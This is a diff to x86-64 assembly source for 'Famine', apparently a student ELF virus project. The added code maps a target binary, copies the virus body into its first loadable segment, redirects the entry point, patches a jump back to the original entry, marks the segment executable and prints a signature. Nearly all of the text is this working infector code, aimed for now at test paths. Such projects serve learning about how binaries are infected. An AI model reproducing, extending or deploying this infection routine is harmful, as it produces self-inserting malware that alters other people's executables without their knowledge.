@@ -1,4 +1,5 @@
 %define PROG_SIZE   _end - main
+%define JMP_OFFSET  jump - main
 %define O_RDWR      2
 %define O_DIRECTORY 0200000
 %define SEEK_END    2
@@ -6,12 +7,14 @@
 %define PROT_WRITE  2
 %define MAP_SHARED  1
 %define PT_LOAD	    1
+%define PF_X        1
 
 %define SYS_OPEN    2
 %define SYS_CLOSE   3
 %define SYS_LSEEK   8
 %define SYS_MMAP    9
 %define SYS_MUNMAP  11
+%define SYS_EXIT    60
 
 struc   Elf64_Ehdr
     e_ident:     resb 16   ;       /* Magic number and other info */
@@ -50,11 +53,6 @@ struc famine
     oldEntry:   resq 1
 endstruc
 
-section .data
-
-str:
-    db "nb phdr = %d", 10, 0
-
 section .text
 
 global main
@@ -76,9 +74,17 @@ main:
     push rbp
     mov rbp, rsp
     sub rsp, famine_size
+    push rdx
+    push rcx
+    push rax
+    push r8
+    push r9
+    push r10
     push rdi
     push rsi
-    mov rdi, [rsi+8]
+
+;    mov rdi, [rsi+8]
+    lea rdi, [rel ptest]
     mov rsi, O_RDWR
     mov rax, SYS_OPEN
     syscall              ; open(filemane, O_RDWR)
@@ -87,7 +93,6 @@ main:
     mov [rsp + fd], rax
     mov rdi, rsp
     call get_file_data
-
 
 get_first_pload:
     mov r9, [rsp + fileData]
@@ -110,13 +115,27 @@ phead_loop:
 first_pload_found:
     add r9, rsi
     mov [rsp + pload], r9
-    lea rdi, [rel str]
-    mov rsi, [r9 + p_filesz]
-
-;    mov rsi, famine_size
-    call printf
-
-
+    mov rdi, [r9 + p_vaddr]
+    add rdi, [r9 + p_memsz]
+    mov [rsp + entry], rdi
+    mov rsi, [rsp + fileData]
+    mov [rsi + e_entry], rdi
+copy_program:
+    mov rdi, [rsp + fileData]
+    add rdi, [r9 + p_filesz]
+    lea rsi, [rel main]
+    mov rdx, PROG_SIZE
+    call ft_memcpy
+    mov rdx, [rsp + entry]
+    add rdx, JMP_OFFSET + 5
+    mov rcx, [rsp + oldEntry]
+    sub ecx, edx
+    mov [rdi + JMP_OFFSET], byte 0xE9
+    mov [rdi + JMP_OFFSET + 1], ecx
+    add qword [r9 + p_memsz], PROG_SIZE
+    add qword [r9 + p_filesz], PROG_SIZE
+    or dword [r9 + p_flags], PF_X           ; ajoute les droit d'execution
+    
 close_all:
     mov rdi, [rsp + fileData]
     mov rsi, [rsp + fileSize]
@@ -126,9 +145,27 @@ close_all:
     mov rax, SYS_CLOSE  
     syscall             ; close(fd)
 exit:
+    mov rdi, 1
+    lea rsi, [rel signature]
+    mov rdx, 49
+    mov rax, 1
+    syscall
+    pop rsi
+    pop rdi
+    pop r10
+    pop r9
+    pop r8
+    pop rax
+    pop rcx
+    pop rdx
+    add rsp, famine_size
+    
+jump:
     leave
     ret
-
+    nop
+    nop
+    nop
 
 get_file_data:
     mov r12, rdi
@@ -150,7 +187,29 @@ get_file_data:
     syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
     cmp rax, 0          ; if (!fileData) return ;
     jz exit
-    mov [r12 + fileData], rax
+    mov [r12 + fileData], rax   ; faire des check pour le format
+    mov rdi, [rax + e_entry]
+    mov [r12 + oldEntry], rdi
+    ret
 
+;  void *ft_memcpy(void *dest, void* src, size_t size)
+ft_memcpy:
+    xor rax, rax
+    jmp ft_memcpy_cmp
+    ft_memcpy_loop:
+    mov bl, [rsi + rax]
+    mov [rdi + rax], bl
+    inc rax
+    ft_memcpy_cmp:
+    cmp rax, rdx
+    jl ft_memcpy_loop
+    mov rax, rdi
+    ret
+
+
+firstDir: db "/tmp/test", 0
+secondDir: db "/tmp/test2", 0
+ptest: db "./ptest", 0
+signature: db "Famine version 1.0 (c)oded by <mtaquet>-<matheme>"
 _end:
 
